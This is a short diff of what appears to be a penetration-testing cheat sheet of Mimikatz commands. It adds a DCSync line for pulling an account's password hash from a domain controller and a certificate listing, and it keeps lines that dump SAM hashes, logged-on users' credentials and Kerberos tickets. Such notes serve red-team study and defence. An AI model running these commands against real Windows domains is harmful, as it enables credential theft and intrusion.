@@ -1649,14 +1649,20 @@ token::list
 # dump hashes from SAM
 lsadump::sam
 
+# ask DC to synchronize --> grab password for account
+lsadump::dcsync /user:user_name_here
+
 # dump credentials of logged-on users
 sekurlsa::logonpasswords
 
 # grab current user's tickets
 sekurlsa::tickets
 
-# get service ticket and write to disk (.kirbi)
+# get service ticket + write to disk (.kirbi)
 kerberos::list /export
+
+# list certificates
+crypto::certificates
 ```
 
 
